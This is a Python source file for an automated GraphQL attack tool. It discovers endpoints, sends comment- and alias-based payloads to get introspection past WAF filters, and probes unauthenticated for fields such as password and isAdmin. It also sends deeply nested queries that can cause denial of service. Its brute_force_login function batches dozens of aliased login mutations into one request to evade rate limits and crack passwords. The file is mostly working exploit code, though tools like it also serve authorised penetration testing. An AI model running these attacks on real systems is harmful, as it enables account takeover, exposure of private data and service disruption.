"""
auto_graphql.py - Automated GraphQL vulnerability detection and exploitation
"""

import re
import json
from typing import Optional
from core.probe import _get_session


def discover_endpoint(base_url: str) -> dict:
    """Discover GraphQL endpoint on target."""
    session = _get_session()
    endpoints_found = []

    # Common GraphQL endpoint paths
    common_paths = [
        '/graphql', '/graphiql', '/api/graphql', '/v1/graphql',
        '/v2/graphql', '/query', '/gql', '/graph',
        '/graphql/console', '/playground', '/altair',
    ]

    for path in common_paths:
        url = base_url.rstrip('/') + path
        try:
            # Try introspection query
            resp = session.post(url, json={"query": "{__typename}"}, timeout=8)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if 'data' in data or 'errors' in data:
                        endpoints_found.append({
                            "url": url,
                            "status": resp.status_code,
                            "has_graphql": True
                        })
                except json.JSONDecodeError:
                    pass

            # Also try GET with query param
            resp_get = session.get(url, params={"query": "{__typename}"}, timeout=8)
            if resp_get.status_code == 200:
                try:
                    data = resp_get.json()
                    if 'data' in data or 'errors' in data:
                        if not any(e["url"] == url for e in endpoints_found):
                            endpoints_found.append({
                                "url": url,
                                "method": "GET",
                                "has_graphql": True
                            })
                except json.JSONDecodeError:
                    pass
        except Exception:
            continue

    # Also try GET with query param on bare base paths (some apps mount at / or /api)
    extra_paths = ['/api', '/']
    for path in extra_paths:
        url = base_url.rstrip('/') + path
        if any(e["url"] == url for e in endpoints_found):
            continue
        try:
            resp_get = session.get(url, params={"query": "{__typename}"}, timeout=8)
            if resp_get.status_code == 200:
                try:
                    data = resp_get.json()
                    if 'data' in data or 'errors' in data:
                        endpoints_found.append({
                            "url": url,
                            "method": "GET",
                            "has_graphql": True
                        })
                except json.JSONDecodeError:
                    pass
        except Exception:
            continue

    return {
        "base_url": base_url,
        "endpoints": endpoints_found,
        "found": len(endpoints_found) > 0
    }


def introspect_bypass(endpoint: str) -> dict:
    """Try introspection with comment-based bypass techniques.

    Many WAFs and GraphQL shields block '__schema' via regex.
    Inserting a GraphQL comment (# + newline) after __schema
    can bypass naive pattern matching while remaining valid syntax.
    """
    session = _get_session()
    bypass_payloads = [
        # Comment + newline after __schema
        '{ __schema\n#\n{ types { name } }',
        # Comment between __ and schema
        '{ __#comment\nschema { types { name kind } }',
        # Inline comment mid-token
        '{ __sch#bypass\nema { queryType { name } mutationType { name } types { name kind fields { name type { name } } } } }',
        # Space + fragment spread trick
        '{ ...F } fragment F on Query { __schema { types { name } } }',
        # Alias trick to hide __schema
        '{ alias1: __schema { types { name } } }',
        # Nested query with alias
        '{ x: __type(name: "Query") { fields { name type { name } } } }',
    ]

    for i, payload in enumerate(bypass_payloads):
        try:
            resp = session.post(endpoint, json={"query": payload}, timeout=12)
            data = resp.json()

            if 'data' in data and data.get('data'):
                result = data['data']
                # Check if we got schema data back
                schema_data = result.get('__schema') or result.get('alias1') or result.get('x')
                if schema_data:
                    return {
                        "endpoint": endpoint,
                        "bypass_successful": True,
                        "technique": payload.split('\n')[0][:60],
                        "technique_index": i,
                        "data": schema_data,
                        "severity": "high"
                    }
        except Exception:
            continue

    # Also try GET-based introspection (sometimes only POST is restricted)
    get_payloads = [
        {"query": "{ __schema { types { name } } }"},
        {"query": '{ __schema\n#\n{ types { name } } }'},
        {"query": "{ ...F } fragment F on Query { __schema { types { name kind } } }"},
    ]
    for payload in get_payloads:
        try:
            resp = session.get(endpoint, params=payload, timeout=12)
            data = resp.json()
            if 'data' in data and data.get('data', {}).get('__schema'):
                return {
                    "endpoint": endpoint,
                    "bypass_successful": True,
                    "technique": "GET_method_introspection",
                    "technique_index": -1,
                    "data": data['data']['__schema'],
                    "severity": "high"
                }
        except Exception:
            continue

    return {
        "endpoint": endpoint,
        "bypass_successful": False,
        "techniques_tried": len(bypass_payloads) + len(get_payloads),
        "severity": "info"
    }


def brute_force_login(endpoint: str, username: str, passwords: list,
                      login_field: str = "login", username_field: str = "username",
                      password_field: str = "password", token_field: str = "token",
                      max_batch: int = 50) -> dict:
    """Use GraphQL aliases to brute force login in a single request.

    Instead of sending N requests (one per password), packs N login
    mutations aliased as a0, a1, ... into one request.  Bypasses
    per-request rate limits since only one HTTP request hits the server.

    Args:
        endpoint: GraphQL endpoint URL
        username: Username to test
        passwords: List of candidate passwords
        login_field: Mutation name (default "login")
        username_field: Input field for username
        password_field: Input field for password
        token_field: Response field indicating success
        max_batch: Max aliases per request (split into batches if larger)
    """
    session = _get_session()
    results = {
        "endpoint": endpoint,
        "username": username,
        "total_passwords": len(passwords),
        "success": False,
        "cracked_password": None,
        "batches_sent": 0,
        "errors": []
    }

    # Split passwords into batches to avoid overly large queries
    for batch_start in range(0, len(passwords), max_batch):
        batch = passwords[batch_start:batch_start + max_batch]
        aliases = []
        for i, pw in enumerate(batch):
            idx = batch_start + i
            # Escape special chars in password for GraphQL string
            pw_escaped = pw.replace('\\', '\\\\').replace('"', '\\"')
            aliases.append(
                f'a{i}: {login_field}({username_field}: "{username}", '
                f'{password_field}: "{pw_escaped}") {{ {token_field} }}'
            )

        query = "mutation { " + " ".join(aliases) + " }"

        try:
            resp = session.post(endpoint, json={"query": query}, timeout=20)
            data = resp.json()
            results["batches_sent"] += 1

            if 'data' in data and data['data']:
                for i, pw in enumerate(batch):
                    alias_key = f'a{i}'
                    alias_data = data['data'].get(alias_key)
                    if alias_data and alias_data.get(token_field):
                        results["success"] = True
                        results["cracked_password"] = pw
                        results["token_preview"] = str(alias_data[token_field])[:40]
                        return results

            if 'errors' in data:
                # Partial errors may still contain some successful aliases
                for i, pw in enumerate(batch):
                    alias_key = f'a{i}'
                    alias_data = (data.get('data') or {}).get(alias_key)
                    if alias_data and alias_data.get(token_field):
                        results["success"] = True
                        results["cracked_password"] = pw
                        results["token_preview"] = str(alias_data[token_field])[:40]
                        return results

        except Exception as e:
            results["errors"].append(f"batch@{batch_start}: {str(e)[:120]}")
            continue

    return results


def introspect(endpoint: str) -> dict:
    """Run full introspection query to discover schema."""
    session = _get_session()

    # Standard introspection query
    introspection_query = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          name
          kind
          fields {
            name
            type {
              name
              kind
              ofType {
                name
                kind
              }
            }
            args {
              name
              type { name kind }
            }
          }
          inputFields {
            name
            type { name kind }
          }
          enumValues {
            name
          }
        }
        directives {
          name
          locations
          args {
            name
            type { name kind }
          }
        }
      }
    }
    """

    try:
        resp = session.post(endpoint, json={"query": introspection_query}, timeout=15)
        data = resp.json()

        if 'errors' in data:
            # Introspection may be disabled
            return {
                "endpoint": endpoint,
                "introspection_disabled": True,
                "errors": data['errors'],
                "types": [],
                "queries": [],
                "mutations": []
            }

        schema = data.get('data', {}).get('__schema', {})
        types = schema.get('types', [])

        # Extract useful types (exclude built-in)
        user_types = [t for t in types if not t['name'].startswith('__')]

        # Extract queries and mutations
        query_type_name = schema.get('queryType', {}).get('name', 'Query')
        mutation_type_name = schema.get('mutationType', {}).get('name', 'Mutation')

        query_type = next((t for t in types if t['name'] == query_type_name), None)
        mutation_type = next((t for t in types if t['name'] == mutation_type_name), None)

        queries = query_type.get('fields', []) if query_type else []
        mutations = mutation_type.get('fields', []) if mutation_type else []

        return {
            "endpoint": endpoint,
            "introspection_disabled": False,
            "total_types": len(types),
            "user_types": [t['name'] for t in user_types],
            "queries": [{"name": q["name"], "args": [a["name"] for a in q.get("args", [])]} for q in queries],
            "mutations": [{"name": m["name"], "args": [a["name"] for a in m.get("args", [])]} for m in mutations],
            "raw_types": user_types
        }

    except Exception as e:
        return {"endpoint": endpoint, "error": str(e)}


def find_private_data(endpoint: str, schema: dict = None) -> dict:
    """Try to access private/unauthorized data through GraphQL."""
    if not schema:
        schema = introspect(endpoint)

    session = _get_session()
    findings = []

    queries = schema.get("queries", [])

    # Try each query to find data leaks
    for q in queries:
        qname = q["name"]
        args = q.get("args", [])

        # Try query without authentication
        query_str = _build_query(qname, args)
        try:
            resp = session.post(endpoint, json={"query": query_str}, timeout=10)
            data = resp.json()

            if 'data' in data and data['data'].get(qname):
                result_data = data['data'][qname]
                # Check if we got actual data
                if result_data and (isinstance(result_data, list) and len(result_data) > 0 or isinstance(result_data, dict)):
                    findings.append({
                        "query": qname,
                        "accessible": True,
                        "data_preview": str(result_data)[:200],
                        "type": "unauthenticated_access"
                    })
        except Exception:
            continue

    # Try to find hidden/private fields
    private_findings = _probe_private_fields(endpoint, session)
    findings.extend(private_findings)

    return {
        "endpoint": endpoint,
        "findings": findings,
        "private_data_found": len(findings) > 0
    }


def _build_query(query_name: str, args: list = None) -> str:
    """Build a GraphQL query string."""
    if args:
        arg_str = ", ".join([f'{a}: ""' for a in args])
        return f"{{ {query_name}({arg_str}) {{ id name email username role isAdmin password }} }}"
    return f"{{ {query_name} {{ id name email username role isAdmin password }} }}"


def _probe_private_fields(endpoint: str, session) -> list:
    """Probe for private fields like isAdmin, role, password."""
    findings = []

    # Common queries that might leak data
    test_queries = [
        ('{"query": "{ users { id username email role isAdmin } }"}', 'users_with_admin_field'),
        ('{"query": "{ user(id: 1) { id username email role isAdmin password } }"}', 'user_admin_fields'),
        ('{"query": "{ posts { id title content published private } }"}', 'private_posts'),
        ('{"query": "{ posts(isPublished: false) { id title content } }"}', 'unpublished_posts'),
    ]

    for query_json_str, test_name in test_queries:
        try:
            resp = session.post(endpoint, json=json.loads(query_json_str), timeout=10)
            data = resp.json()

            if 'data' in data and data['data']:
                for key, val in data['data'].items():
                    if val:
                        findings.append({
                            "test": test_name,
                            "query": key,
                            "data_preview": str(val)[:200],
                            "type": "private_field_access"
                        })
        except Exception:
            continue

    return findings


def test_batching(endpoint: str) -> dict:
    """Test for GraphQL batching (query batching attack)."""
    session = _get_session()

    # Try sending multiple queries in one request
    batch_query = [
        {"query": "{__typename}"},
        {"query": "{__typename}"},
        {"query": "{__typename}"}
    ]

    try:
        resp = session.post(endpoint, json=batch_query, timeout=10)
        data = resp.json()

        if isinstance(data, list) and len(data) == 3:
            return {
                "batching_supported": True,
                "severity": "medium",
                "details": "Server accepts batched queries - may bypass rate limiting"
            }
    except Exception:
        pass

    return {"batching_supported": False}


def test_depth_limit(endpoint: str, max_depth: int = 20) -> dict:
    """Test for query depth limit bypass (DoS potential)."""
    session = _get_session()

    # Build deeply nested query
    depth = max_depth
    query = "__typename " * depth
    nested_query = "{" + " ".join([f"a{i}{{" for i in range(depth)]) + "__typename" + "}" * (depth + 1)

    try:
        resp = session.post(endpoint, json={"query": nested_query}, timeout=15)
        data = resp.json()

        if 'errors' not in data or any('depth' not in str(e).lower() for e in data.get('errors', [])):
            return {
                "depth_limit": False,
                "severity": "medium",
                "details": f"Query with depth {max_depth} accepted - potential DoS via deep nesting"
            }
    except Exception:
        pass

    return {"depth_limit": True}


def test_field_suggestions(endpoint: str) -> dict:
    """Test if server leaks field names via suggestions."""
    session = _get_session()

    # Query with typo to trigger suggestions
    query = "{ users { id nme } }"  # 'nme' is typo for 'name'

    try:
        resp = session.post(endpoint, json={"query": query}, timeout=10)
        data = resp.json()

        if 'errors' in data:
            error_msg = str(data['errors'])
            if 'did you mean' in error_msg.lower() or 'suggestion' in error_msg.lower():
                return {
                    "suggestions_enabled": True,
                    "severity": "low",
                    "details": f"Field suggestions leak schema info: {error_msg[:200]}",
                    "suggestions": error_msg
                }
    except Exception:
        pass

    return {"suggestions_enabled": False}


def full_scan(base_url: str) -> dict:
    """Full GraphQL security scan."""
    results = {
        "base_url": base_url,
        "endpoint_discovery": None,
        "introspection": None,
        "private_data": None,
        "batching": None,
        "depth_limit": None,
        "field_suggestions": None,
        "findings_count": 0,
        "severity": "info"
    }

    # 1. Discover endpoint
    discovery = discover_endpoint(base_url)
    results["endpoint_discovery"] = discovery

    if not discovery["found"]:
        results["error"] = "No GraphQL endpoint found"
        return results

    endpoint = discovery["endpoints"][0]["url"]

    # 2. Introspection
    intro = introspect(endpoint)
    results["introspection"] = intro
    if not intro.get("introspection_disabled"):
        results["findings_count"] += 1
        results["severity"] = "medium"

    # 2b. If introspection blocked, try bypass techniques
    if intro.get("introspection_disabled"):
        bypass = introspect_bypass(endpoint)
        results["introspection_bypass"] = bypass
        if bypass.get("bypass_successful"):
            results["findings_count"] += 1
            results["severity"] = "high"
            # Use bypass data as effective schema
            intro["introspection_disabled"] = False
            intro["bypassed"] = True
            intro["raw_types"] = bypass.get("data", {}).get("types", [])

    # 3. Find private data
    private = find_private_data(endpoint, intro)
    results["private_data"] = private
    if private["private_data_found"]:
        results["findings_count"] += len(private["findings"])
        results["severity"] = "high"

    # 4. Test batching
    batch = test_batching(endpoint)
    results["batching"] = batch
    if batch.get("batching_supported"):
        results["findings_count"] += 1

    # 5. Test depth limit
    depth = test_depth_limit(endpoint)
    results["depth_limit"] = depth
    if not depth.get("depth_limit"):
        results["findings_count"] += 1

    # 6. Test field suggestions
    suggestions = test_field_suggestions(endpoint)
    results["field_suggestions"] = suggestions
    if suggestions.get("suggestions_enabled"):
        results["findings_count"] += 1

    return results


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python auto_graphql.py <base_url>")
        sys.exit(1)

    url = sys.argv[1]
    result = full_scan(url)
    print(json.dumps(result, indent=2, default=str))
